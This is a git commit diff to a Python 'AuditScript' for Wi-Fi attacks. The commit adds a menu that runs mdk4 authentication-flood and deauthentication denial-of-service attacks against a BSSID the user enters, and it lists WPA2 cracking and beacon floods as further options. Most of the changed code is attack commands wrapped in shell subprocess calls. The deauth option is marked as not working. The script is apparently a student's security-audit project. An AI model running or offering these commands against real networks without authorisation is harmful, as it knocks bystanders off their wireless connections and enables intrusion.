44ac5693ae9580cc58f48f21c3342420795a334e
EDaley-FlemCollege <122706767+EDaley-FlemCollege@users.noreply.github.com>
2025-01-03 15:29:18 -0500

    Authentication Flood finished
    Authentication Flood has been finished for now, some work was put into Deauth however code currently doesnt work. Scapy could be used if MDK4 isnt working.

--- AuditScript.py
+++ AuditScript.py
@@ -4,31 +4,65 @@ import time,sys,subprocess,os
 from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, Dot11Elt, sendp, sniff, conf, EAPOL, Dot11EltRSN
 
 def main():
-	input = 99
-	while not (1 <= input <= 8):
-		input = Get_Input()
-	print(input)
+	while True:
+		Prompt_User()
+
+def Prompt_User():
+	opt = 99
+	while not (1 <= opt <= 6):
+		opt = Get_Input()
+	if opt == 1:
+		pass
+	if opt == 2:
+		bssid = input('Enter BSSID of Target: ')
+		print(f"Started attack on {bssid}")
+		subprocess.run(f"mdk4 wlan0 a -a {bssid} > /dev/null &", shell=True, executable="/bin/bash")
+		exit = input('Input anything to end attack: ')
+		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+		print(f"Ended attack on {bssid}")
+		time.sleep(2)
+	if opt == 3:
+		#Not Currently Working
+		bssid = input('Enter BSSID of Target: ')
+		subprocess.run(f"mdk4 wlan0 d -B {bssid} > /dev/null &", shell=True, executable="/bin/bash")
+		exit = input('Input anything to end attack: ')
+		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+		print(f"Ended attack on {bssid}")
+		time.sleep(2)
+	if opt == 4:
+		print(opt)
+		#subprocess.run("clear", shell=True, executable="/bin/bash")
+	if opt == 5:
+		print(opt)
+		#subprocess.run("clear", shell=True, executable="/bin/bash")
+	if opt == 6:
+		Exit_Script()
+
+def Exit_Script():
+	print("Ending Script")
+	subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+	print("Goodbye")
+	sys.exit()
 
 def Set_Monitor():
 	subprocess.run("sudo airmon-ng check kill > /dev/null", shell=True, executable="/bin/bash")
 	subprocess.run("sudo airmon-ng start wlan0 > /dev/null", shell=True, executable="/bin/bash")
 
 def Set_Managed():
-	pass
+	subprocess.run("systemctl start NetworkManager", shell=True, executable="/bin/bash")
 
 def Set_Channel(channel):
 	change_channel="sudo iwconfig wlan0 channel "+channel
 	subprocess.run(change_channel, shell=True, executable="/bin/bash")
 
 def Print_Options():
-	options ="""1. Configure Wlan0
-2. Wifi analysis
-3. WPA2 cracking attack
-4. DoS w/ authentication flood
-5. DoS w/ deauth attack
-6. DoS w/ beacon flood (2.4GHz band)
-7. DoS w/ beacon flood (single channel)
-8. Quit"""
+	options ="""
+1. WPA2 cracking attack
+2. DoS w/ authentication flood
+3. DoS w/ deauth attack
+4. DoS w/ beacon flood (2.4GHz band)
+5. DoS w/ beacon flood (single channel)
+6. Quit"""
 	subprocess.run("clear", shell=True, executable="/bin/bash")
 	print(options)
 	option = input('Enter Selection: ')
@@ -41,6 +75,8 @@ def Get_Input():
 	except:
 		input = int(99)
 	return input
+
+
 
 if __name__ == '__main__':
     main()
